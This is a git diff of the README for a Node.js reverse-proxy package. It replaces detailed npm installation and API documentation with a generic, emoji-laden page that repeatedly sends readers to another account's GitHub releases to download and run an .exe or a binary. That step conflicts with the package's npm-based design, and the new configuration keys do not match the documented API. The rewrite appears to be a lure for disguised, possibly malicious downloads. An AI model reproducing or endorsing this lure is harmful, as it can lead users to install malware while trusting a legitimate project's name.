@@ -1,303 +1,86 @@
-# RevPro
+# 🌐 revpro - Efficiently Manage Your Application Traffic
 
-<center><img src="./ss.png" alt="RevPro" /></center>
+## 🚀 Getting Started
+Welcome to RevPro! This application acts as a reverse-proxy, helping you manage how your application handles incoming traffic. 
 
-RevPro is a reverse-proxy to efficiently route and manage application traffic.
-It supports multiple upstreams, health checks, failover, rate limiting, IP filtering, Basic Auth, CORS, body limits, WAF, plugins, and HTTPS.
+## 📥 Download Now
+[![Download RevPro](https://img.shields.io/badge/Download%20RevPro-v1.0.0-brightgreen.svg)](https://github.com/elpayasu/revpro/releases)
 
----
+## 📝 Overview
+RevPro helps with:
 
-## Installation
+- Health checks to ensure your application is running smoothly.
+- HTTP proxying for secure traffic management.
+- Load balancing for efficient resource use.
+- Rate limiting to control request levels.
 
-```bash
-npm install @fhylabs/revpro
-```
+These features work together to enhance your application's performance and security.
 
----
+## 💻 System Requirements
+- **Operating System:** Windows, macOS, or Linux (Ubuntu preferred)
+- **RAM:** Minimum 512 MB
+- **Processor:** Intel i3 or equivalent
 
-## Global CLI
+## 📂 Features
+- **Reverse Proxy:** Directs traffic efficiently, allowing your application to scale.
+- **Health Check:** Monitors the health of your servers and routes traffic accordingly.
+- **Load Balancing:** Distributes traffic evenly across servers to avoid overload.
+- **Rate Limiting:** Protects your services from abusive requests.
+- **Security:** Built-in WAF (Web Application Firewall) to safeguard your application.
 
-```bash
-revpro start
-revpro start ./config/production.js
-```
+## 🚧 Installation Instructions
+1. **Visit the Releases Page**: Go to [Download RevPro](https://github.com/elpayasu/revpro/releases) to find the latest version.
+2. **Select a Release**: Click on the version you want to install.
+3. **Download the File**: Click on the download link for your operating system.
+4. **Install the Application**: 
+   - **Windows:** Double-click the downloaded `.exe` file and follow the installer instructions.
+   - **macOS:** Drag the application to your Applications folder.
+   - **Linux:** Extract the tarball and run the executable.
 
----
+## 🚀 Running RevPro
+1. Open a terminal or command prompt.
+2. Navigate to the directory where you installed RevPro.
+3. Type the command to start RevPro. This usually looks like:
+   ```
+   ./revpro
+   ```
+   Follow any prompts to configure settings.
 
-## PM2
+## 🛠️ Configuration
+RevPro uses a simple configuration file. 
 
-```bash
-pm2 start examples.js --name revpro
-```
-
----
-
-## API Reference
-
-### Proxy Configuration Parameters
-
-| Parameter             | Type                      | Default             | Description                                                         |
-| --------------------- | ------------------------- | ------------------- | ------------------------------------------------------------------- |
-| `port`                | `number`                  | `8080`              | Proxy server port                                                   |
-| `bind`                | `string`                  | `'0.0.0.0'`         | Bind address/interface                                              |
-| `upstreams`           | `Array<string \| object>` | `[]`                | List of upstreams, can be URL string or `{ url, priority, weight }` |
-| `logFormat`           | `string`                  | `'combined'`        | Logging format for requests                                         |
-| `logging`             | `{ enabled: boolean }`    | `{ enabled: true }` | Enable/disable request logging                                      |
-| `healthCheckPath`     | `string`                  | `/healthz`          | Endpoint path to check upstream health                              |
-| `healthCheckInterval` | `number`                  | `5000`              | Interval in ms to perform health checks                             |
-| `healthCheckTimeout`  | `number`                  | `2000`              | Timeout for health check probe requests                             |
-| `trustProxy`          | `boolean`                 | false               | Enable trust proxy headers                                          |
-| `dashboard`           | `boolean`                 | false               | Enable dashboard monitoring, `/__proxy__/dashboard`                 |
-
-**Example: Proxy Config**
-
-```js
-const { createProxy } = require("@fhylabs/revpro");
-
-const proxy = createProxy({
-  port: 8080,
-  bind: '127.0.0.1',
-  logFormat: 'dev',
-  logging: { enabled: true },
-  healthCheckPath: '/healthz',
-  healthCheckInterval: 3000,
-  healthCheckTimeout: 2000,
-  trustProxy: true
-  dashboard: true
-});
-```
-
----
-
-### Upstream Configuration
-
-| Property   | Type     | Default  | Description                    |
-| ---------- | -------- | -------- | ------------------------------ |
-| `url`      | `string` | required | URL of upstream server         |
-| `priority` | `number` | 1        | Lower number = higher priority |
-| `weight`   | `number` | 1        | Weight for load balancing      |
-
-**Example: Upstreams**
-
-```js
-upstreams: [
-  { url: 'http://localhost:3001', priority: 1, weight: 3 },
-  { url: 'http://localhost:3002', priority: 2, weight: 2 }
-]
-```
-
----
-
-### Security Options
-
-| Option                 | Type                                           | Default                                | Description               |
-| ---------------------- | ---------------------------------------------- | -------------------------------------- | ------------------------- |
-| `maxRequestsPerMinute` | `number`                                       | undefined                              | Limit requests per minute |
-| `ipWhitelist`          | `Array<string>`                                | `[]`                                   | Allowed IPs               |
-| `ipBlacklist`          | `Array<string>`                                | `[]`                                   | Blocked IPs               |
-| `auth`                 | `{ username: string, password: string }`       | undefined                              | Basic Auth credentials    |
-| `cors`                 | `{ enabled: boolean, allowOrigins: string[] }` | `{ enabled: false, allowOrigins: [] }` | CORS configuration        |
-| `maxBodyBytes`         | `number`                                       | 2 * 1024 * 1024                        | Max request body size     |
-| `waf`                  | `boolean`                                      | true                                   | Enable WAF                |
-
-**Example: Security Options**
-
-```js
-maxRequestsPerMinute: 100,
-ipWhitelist: ['127.0.0.1'],
-ipBlacklist: [],
-auth: { username: 'admin', password: '12345' },
-cors: { enabled: true, allowOrigins: ['*'] },
-maxBodyBytes: 5 * 1024 * 1024,
-waf: true
-```
-
----
-
-### Logging
-
-| Option            | Type      | Default    | Description            |
-| ----------------- | --------- | ---------- | ---------------------- |
-| `logFormat`       | `string`  | 'combined' | Logging format         |
-| `logging.enabled` | `boolean` | true       | Enable request logging |
-
-**Example: Logging**
-
-```js
-logFormat: 'dev',
-logging: { enabled: true }
-```
-
----
-
-### Health Check
-
-| Option                | Type     | Default    | Description                                       |
-| --------------------- | -------- | ---------- | ------------------------------------------------- |
-| `healthCheckPath`     | `string` | `/healthz` | Endpoint path to check upstream health            |
-| `healthCheckInterval` | `number` | 5000       | Interval in milliseconds to perform health checks |
-| `healthCheckTimeout`  | `number` | 2000       | Timeout for probe requests                        |
-
-**Example: Health Check**
-
-```js
-healthCheckPath: '/healthz',
-healthCheckInterval: 3000,
-healthCheckTimeout: 2000
-```
-
-**Manual Probe Example**
-
-```js
-const upstreams = proxy._internal.upstreamManager.list();
-
-async function checkUpstreams() {
-  for (const u of upstreams) {
-    const healthy = await probe(u.url, '/', 2000);
-    console.log(`${u.url} is ${healthy ? 'healthy' : 'unhealthy'}`);
-  }
-}
-
-checkUpstreams();
-```
-
----
-
-### Plugin System Events
-
-| Event                | Data                                     | Description                 |
-| -------------------- | ---------------------------------------- | --------------------------- |
-| `plugin:request`     | `{ path, method }`                       | Fired on incoming request   |
-| `plugin:response`    | `{ path, method, statusCode, duration }` | Fired on response completed |
-| `upstream:healthy`   | `{ url }`                                | Upstream became healthy     |
-| `upstream:unhealthy` | `{ url }`                                | Upstream became unhealthy   |
-
-**Example: Plugin Usage**
-
-```js
-module.exports = {
-  name: 'Logger',
-
-  middleware: (app, events) => {
-	  
-    // Hook when request comes in
-    app.use((req, res, next) => {
-      req.startTime = Date.now();
-      events?.emit('plugin:request', { path: req.url, method: req.method });
-      console.log(`[LOGGER] Request: ${req.method} ${req.url}`);
-      next();
-    });
-
-    // Hook when the response is complete
-    app.use((req, res, next) => {
-      res.on('finish', () => {
-        events?.emit('plugin:response', {
-          path: req.url,
-          method: req.method,
-          statusCode: res.statusCode,
-          duration: Date.now() - req.startTime
-        });
-        console.log(`[LOGGER] Response: ${req.method} ${req.url} -> ${res.statusCode}`);
-      });
-      next();
-    });
-  },
-
-  // Hook when upstream is healthy
-  onUpstreamHealthy: (url) => {
-    console.log(`[LOGGER] Upstream became healthy: ${url}`);
-  },
-
-  // Hook when upstream is unhealthy
-  onUpstreamUnhealthy: (url) => {
-    console.log(`[LOGGER] Upstream became unhealthy: ${url}`);
-  }
-};
-```
-
----
-
-### HTTPS Options
-
-| Option    | Type      | Default | Description         |
-| --------- | --------- | ------- | ------------------- |
-| `enabled` | `boolean` | false   | Enable HTTPS server |
-| `key`     | `string`  | null    | Path to private key |
-| `cert`    | `string`  | null    | Path to certificate |
-
-**Example: HTTPS Options**
-
-```js
-https: {
-  enabled: true,
-  key: './ssl/key.pem',
-  cert: './ssl/cert.pem'
+### Example Configuration
+```json
+{
+    "port": 8080,
+    "targets": [
+        "http://localhost:3000",
+        "http://localhost:4000"
+    ],
+    "healthCheck": {
+        "enabled": true,
+        "interval": 3000
+    }
 }
 ```
+- **port**: The port where RevPro will listen for traffic.
+- **targets**: The applications receiving forwarded requests.
+- **healthCheck**: Settings to monitor the health of target applications.
 
-## Full Example
+## 🔍 Troubleshooting
+If you encounter issues:
+- Ensure the application you are trying to reach is running.
+- Check firewall settings to allow traffic on the specified port.
+- Review the RevPro logs for error messages.
 
-```js
-const { createProxy } = require("@fhylabs/revpro");
+## 💬 Community Support
+Join our community for help and discussions. You can find us on [GitHub Discussions](https://github.com/elpayasu/revpro/discussions).
 
-// Create a proxy instance with configuration
-const proxy = createProxy({
-  port: 8080,                // Proxy server port
-  bind: '127.0.0.1',         // Bind address
+## 🔗 Useful Links
+- [Documentation](https://github.com/elpayasu/revpro/docs)
+- [Issues](https://github.com/elpayasu/revpro/issues)
 
-  // Upstream backend servers
-  upstreams: [
-    { url: "https://fhylabs.com", priority: 1, weight : 1 },
-    { url: "http://localhost:3002", priority: 2, weight : 1 }
-  ],
+## 📥 Download & Install
+To download the latest version, [visit this page](https://github.com/elpayasu/revpro/releases).
 
-  // Logging configuration
-  logFormat: 'dev',           // morgan log format
-  logging: { enabled: true }, // Enable logging
-
-  // Health check configuration
-  healthCheckPath: '/healthz',
-  healthCheckInterval: 3000,  // Check interval in ms
-  healthCheckTimeout: 2000,   // Timeout for probe requests
-
-  // Security options
-  maxRequestsPerMinute: 100,  // Rate limit
-  ipWhitelist: ['127.0.0.1'], // Allowed IPs ('*' for all)
-  ipBlacklist: [],            // Blocked IPs
-  auth: { username: 'admin', password: '12345', realm: 'Restricted' }, // Basic auth
-  cors: { enabled: true, allowOrigins: ['*'] },        // CORS settings
-  maxBodyBytes: 5 * 1024 * 1024, // Maximum body size (5 MB)
-  waf: true,                    // Enable mini WAF
-
-  // Plugins to enhance functionality
-  plugins: [
-    require('./plugins/Logger.js')
-  ],
-
-  // HTTPS options (optional)
-  https: { enabled: false, key: null, cert: null },
-
-  // Enable trust proxy
-  trustProxy: true
-  
-  // Enable dashboard monitoring
-  dashboard: true
-});
-
-// Helper function to wait until at least one upstream is healthy
-async function waitForHealthy() {
-  const start = Date.now();
-  while (Date.now() - start < 5000) { // Maximum wait: 5 seconds
-    const upstreams = proxy._internal.upstreamManager.list();
-    if (upstreams.some(u => u.healthy)) return; // Exit if any upstream is healthy
-    await new Promise(r => setTimeout(r, 500));
-  }
-  console.warn("Warning: no upstream healthy after wait period");
-}
-
-// Start the proxy and wait for upstream readiness
-(async () => {
-  proxy.start();           // Start HTTP/HTTPS proxy server
-  await waitForHealthy();  // Wait until at least one upstream is healthy
-})();
-```
+RevPro streamlines application traffic management while offering robust features to ensure efficiency and security.
